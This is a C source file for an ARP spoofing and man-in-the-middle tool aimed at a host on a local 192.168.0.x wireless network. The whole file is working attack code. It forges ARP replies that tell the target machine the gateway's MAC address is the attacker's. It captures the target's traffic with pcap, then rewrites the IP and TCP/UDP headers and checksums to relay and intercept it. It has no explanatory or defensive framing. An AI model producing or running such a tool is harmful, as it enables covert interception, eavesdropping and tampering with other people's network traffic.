#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_arp.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include "pcap.h"
#include <sys/types.h>
#include <sys/signal.h>

int sockfd;								//AF_PACKET type socket	
struct sockaddr_ll peer_addr;						//AF_PACKET type socket address
unsigned char my_ip[4] = {192, 168, 0, 100};				//my ip address
unsigned char gateway_ip[4] = {192, 168, 0, 253};				//gateway ip address
unsigned char attack_ip[4] = {192, 168, 0, 102};				//ip address to be attacked
unsigned char my_mac[6] = {0x00, 0x23, 0x4e, 0xd8, 0x05, 0x99}; 	//my mac address
unsigned char gateway_mac[6] = {0x40, 0x16, 0x9f, 0x4f, 0x03, 0x04};	//gateway mac address
//unsigned char gateway_mac[6] = {0x00, 0x1e, 0x58, 0x8e, 0x6a, 0x8e};	//gateway mac address
unsigned char attack_mac[6];
unsigned char temp_buf[1024];
unsigned char frame[2048];
int no_attack_mac = 1;

//frame header 14 bytes
struct frame_hdr {
    unsigned char dst_mac[6];
    unsigned char src_mac[6];
    unsigned short frm_type;
};
//all frame 14+8+20 bytes
struct frame_ether {
    struct frame_hdr fh;
    struct arphdr ah;
    unsigned char src_mac[6];
    unsigned char src_ip[4];
    unsigned char dst_mac[6];
    unsigned char dst_ip[4];
};

unsigned short ip_cksum(unsigned short *data, int len);
unsigned short tcpudp_cksum(unsigned short *fakehead, unsigned short *data, int len);
void send_arp(const unsigned char *attack_ip);
void mypcap_callback(unsigned char *arg, const struct pcap_pkthdr *head, const unsigned char *packet);
void *mypcap_listen(void *arg);
void catch_sigint(int signum);
void catch_sigalrm(int signum);
void mypcap_doip(const unsigned char *packet, int len);
void mypcap_doarp(const unsigned char *packet, int len);


int main(int argc, char **argv) {

    if(argc > 1) {
        int n = atoi(argv[1]);
        if(n > 1 && n < 255 && n != 9)attack_ip[3] = n;
    }


    printf("attack ip is = %d\n", attack_ip[3]);

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = catch_sigint;
    sigaction(SIGINT, &sa, NULL);

    sa.sa_handler = catch_sigalrm;
    sigaction(SIGALRM, &sa, NULL);

    //创建pcap监听工作线程
    pthread_t tid;
    pthread_create(&tid, NULL, mypcap_listen, NULL);

    //创建AF_PACKET类型socket
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(sockfd == -1)perror("socket()");

    //初始化struct sockaddr_ll 类型的socket地址结构
    memset(&peer_addr, 0, sizeof(peer_addr));
    peer_addr.sll_family = AF_PACKET;
    struct ifreq req;
    strcpy(req.ifr_name, "wlan0");
    if(ioctl(sockfd, SIOCGIFINDEX, &req) != 0)
        perror("ioctl()");
    peer_addr.sll_ifindex = req.ifr_ifindex;
    peer_addr.sll_protocol = htons(ETH_P_ARP);

    send_arp(attack_ip);

    while (1) {
        sleep(100);
    }
    pthread_exit(NULL);
    return 0;
}


unsigned short ip_cksum(unsigned short *data, int len) {
    int result = 0;
    int i;
    for(i=0; i<len/2; i++) {
        result += *data;
        data++;
    }
    if(len%2 == 1) {
        result += *(((unsigned char*)data)+len-1);
    }
    while(result >> 16)result = (result&0xffff) + (result>>16);
    return ~result;
}


unsigned short tcpudp_cksum(unsigned short *fakehead, unsigned short *data, int len) {
    int result = 0;
    int i;
    for(i=0; i<6; i++) {
        result += *fakehead;
        fakehead++;
    }
    for(i=0; i<len/2; i++) {
        result += *data;
        data++;
    }
    if(len%2 == 1) {
        result += *((unsigned char*)data);
    }
    while(result >> 16)result = (result&0xffff) + (result>>16);
    return ~result;
}


void send_arp(const unsigned char* attack_ip) {
    unsigned char broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    //build arp frame
    struct frame_ether frame;

    memcpy(frame.fh.dst_mac, broad_mac, 6);
    memcpy(frame.fh.src_mac, my_mac, 6);

    frame.fh.frm_type = htons(ETH_P_ARP);

    frame.ah.ar_hrd = htons(ARPHRD_ETHER);
    frame.ah.ar_pro = htons(ETH_P_IP);
    frame.ah.ar_hln = 6;
    frame.ah.ar_pln = 4;
    frame.ah.ar_op = htons(ARPOP_REQUEST);

    memcpy(frame.src_mac, my_mac, 6);
    memcpy(frame.src_ip, my_ip, 4);
    memcpy(frame.dst_mac, broad_mac, 6);
    memcpy(frame.dst_ip, attack_ip, 4);

    int nbytes = sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
    printf("send arp request: who's ip is 192.168.0.%d\n", attack_ip[3]);
}


void mypcap_doip(const unsigned char *packet, int len) {

    //打印ip数据包的相关信息
    printf("IP\t");
    inet_ntop(AF_INET, packet+14+12, temp_buf, 128);
    printf("%s\t", temp_buf);	
    printf("->\t");	
    inet_ntop(AF_INET, packet+14+16, temp_buf, 128);
    printf("%s\t", temp_buf);	
    printf("protocol=%d\t", *(packet+14+9));
    printf("%d bytes\n", len);
    int ip_protocol = *(packet+14+9);

    //判断ip 协议类型支持 icmp tcp 和 udp 三种类型	
    if(ip_protocol != 1 && ip_protocol != 6 && ip_protocol != 17) {
        printf("Ip protocol %d not supported ...\n", ip_protocol);
        return;
    }

    //计算出udp或者tcp的长度(udp tcp头 + udp tcp数据长度)
    unsigned short tcpudp_len = ntohs(*((unsigned short*)(packet+14+2))) - 20;
    unsigned short tcpudp_len_net = htons(tcpudp_len);

    //构建新的数据帧	
    memcpy(frame, packet, len);


    //修改数据帧的 以太网帧头 和 ip头	
    if(memcmp(packet+14+12, attack_ip, 4) == 0 && (memcmp(packet+14+16, my_ip, 3) != 0 //ip from attack machine and send to internet
                                                   || memcmp(packet+14+16, gateway_ip, 4) == 0) && memcmp(packet, my_mac, 6) == 0) { //ip send to gateway and send to my mac
        memcpy(frame, gateway_mac, 6); //send to gateway mac
        memcpy(frame+6, my_mac, 6);    //of course from my mac, to mac keep
        memcpy(frame+14+12, my_ip, 4); //of cousre form my ip, to ip keep
        memset(frame+14+10, 0, 2);      //cksum
        unsigned short ipsum = ip_cksum((unsigned short*)(frame+14), 20);
        memcpy(frame+14+10, &ipsum, 2);
    } else if((memcmp(packet+14+12, my_ip, 3) != 0 || memcmp(packet+14+12, gateway_ip, 4) == 0) //ip from internet or ip from gateway
              && memcmp(packet+14+16, my_ip, 4) == 0 //ip send to me  
              && memcmp(packet, my_mac, 6) == 0) {   //mac send to me
        if(no_attack_mac)return; 
        memcpy(frame, attack_mac, 6); // to mac is attack machine mac 
        memcpy(frame+6, my_mac, 6);   // from mac of course is mine
        memset(frame+14+10, 0, 2);    // cksum 
        memcpy(frame+14+16, attack_ip, 4); //dst ip is attack machine ip
        unsigned short cksum = ip_cksum((unsigned short*)(frame+14), 20);
        memcpy(frame+14+10, &cksum, 2);	
    } else {

        return;
    }
    //修改数据帧的tcp或者udp头
    if(*(packet+14+9) == 17) { 	//udp
        unsigned char fakehead[12];
        memset(fakehead, 0, sizeof(fakehead));
        memcpy(fakehead, frame+14+12, 4);		
        memcpy(fakehead+4, frame+14+16, 4);
        memcpy(fakehead+9, frame+14+9, 1);
        memcpy(fakehead+10, &tcpudp_len_net, 2);
        memset(frame+14+20+6, 0, 2);
        unsigned short udpsum = tcpudp_cksum((unsigned short*)fakehead, (unsigned short*)(frame+14+20), tcpudp_len);
        memcpy(frame+14+20+6, &udpsum, 2);
    } else if(*(packet+14+9) == 6) {	//tcp
        unsigned char fakehead[12];
        memset(fakehead, 0, sizeof(fakehead));
        memcpy(fakehead, frame+14+12, 4);		
        memcpy(fakehead+4, frame+14+16, 4);			
        memcpy(fakehead+9, frame+14+9, 1);
        memcpy(fakehead+10, &tcpudp_len_net, 2);
        memset(frame+14+20+16, 0, 2);
        unsigned short tcpsum = tcpudp_cksum((unsigned short*)fakehead, (unsigned short*)(frame+14+20), tcpudp_len);
        memcpy(frame+14+20+16, &tcpsum, 2);
    }		


    //发送新的数据帧
    int nbytes = sendto(sockfd, frame, len, 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
    
    
    return;

    //打印新的数据帧详细信息
    int i=0;
    printf("[ether+ip]\t"); 
    for(i=0; i<14+20; i++) {
        printf("%02x ", frame[i]);
    }

    if(*(packet+14+9) == 6) {
        unsigned char tcphl = (*(frame+14+20+12) >> 4) << 2;
        printf("\n[tcp]\t");
        for(; i<14+20+tcphl; i++)
            printf("%02x ", frame[i]);

        printf("\n[data]\t");
        for(; i<len; i++)printf("%c", frame[i]);
    } else if(*(packet+14+9) == 17) {
        printf("\n[udp]\t");
        for(; i<14+20+8; i++)
            printf("%02x ", frame[i]);

        printf("\n[data]\t");
        for(; i<len; i++)
            printf("%c", frame[i]);
    }
    printf("\n");

}


void mypcap_doarp(const unsigned char *packet, int len) {
    struct frame_ether *old_frame= (struct frame_ether*)packet;
    struct frame_ether frame;
    memcpy(&frame, packet, sizeof(frame));
    int ar_op = ntohs(frame.ah.ar_op);

    //arp reply form attack machine, because of send_arp() function
    //then faked a reply arp packet to attack machine 
    //tell attack machine that gatway's mac is my mac
    if (ar_op == ARPOP_REPLY && (old_frame->src_ip)[3] == attack_ip[3] && (old_frame->dst_ip)[3] == my_ip[3]) {		//normal arp reply from attack_ip
        //bulid faked arp reply frame
        memcpy(attack_mac, old_frame->fh.src_mac, 6);	
        no_attack_mac = 0;	
        memcpy(frame.fh.dst_mac, old_frame->fh.src_mac, 6);
        memcpy(frame.fh.src_mac, my_mac, 6);
        frame.ah.ar_op = htons(ARPOP_REPLY);
        memcpy(frame.dst_mac, old_frame->src_mac, 6);
        memcpy(frame.dst_ip,  attack_ip, 4);
        memcpy(frame.src_mac, my_mac, 6);
        memcpy(frame.src_ip,  gateway_ip, 4);
        //send faked arp reply frame
        int nbytes = sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
        printf("success faked 192.168.1.%d \n", (old_frame->src_ip)[3]);

    }

    //
    if(ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == gateway_ip[3] || 
       ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == attack_ip[3] && (old_frame->dst_ip)[3] == gateway_ip[3]) {		//case 2 a
        send_arp(attack_ip);
        alarm(1);
    }
}

void mypcap_callback(unsigned char *arg, const struct pcap_pkthdr *head, const unsigned char *packet) {

    unsigned short frm_type = ntohs(*((unsigned short*)(packet+12)));
    switch(frm_type) {
    case ETH_P_ARP:mypcap_doarp(packet, head->len);break;
    case ETH_P_IP:mypcap_doip(packet, head->len);break;
    default:printf("Unkonw frame type(%d)...\n", frm_type);break;
    }

}


//thread listen arp 
void *mypcap_listen(void *arg) {
    char errbuf[1024];
    char *dev= "wlan0";
    pcap_t *handle = pcap_open_live(dev, 2048, 0, 1000, errbuf);
   
    if(handle == NULL)
        printf("pcap_open_live():%s\n", errbuf);

    unsigned int net,mask;
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
        printf("pcap_lookupnet():%s\n", errbuf);

    //struct bpf_program fp;
    //	if(pcap_compile(handle, &fp, "arp", 0, net) == -1)printf("pcap_compile():%s\n", errbuf);
    //	if(pcap_setfilter(handle, &fp) == -1)printf("pcap_setfilter():%s\n", errbuf);

    while(pcap_loop(handle, -1, mypcap_callback, NULL) != -1);

    printf("pcap_loop return error\n");
    return NULL;
}



void catch_sigint(int signum) {
    printf("catch sigint ...\n");
    if(no_attack_mac == 1)exit(0);
    struct frame_ether frame;
    memset(&frame, 0, sizeof(frame));

    memcpy(frame.fh.dst_mac, attack_mac, 6);
    memcpy(frame.fh.src_mac, gateway_mac, 6);
    frame.fh.frm_type = htons(ETH_P_ARP); 

    frame.ah.ar_hrd = htons(ARPHRD_ETHER);
    frame.ah.ar_pro = htons(ETH_P_IP);
    frame.ah.ar_hln = 6;
    frame.ah.ar_pln = 4;
    frame.ah.ar_op = htons(ARPOP_REPLY);

    memcpy(&frame.src_mac, gateway_mac, 6);
    memcpy(&frame.src_ip, gateway_ip, 4);
    memcpy(&frame.dst_mac, attack_mac, 6);
    memcpy(&frame.dst_ip, attack_ip, 4);

    int nbytes = sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
    printf("Success restore  192.168.0.%d arp cache\nexit...", attack_ip[3]);
    exit(0);
}

void catch_sigalrm(int signum) {
    printf("this is alarm \n");
    send_arp(attack_ip);
}


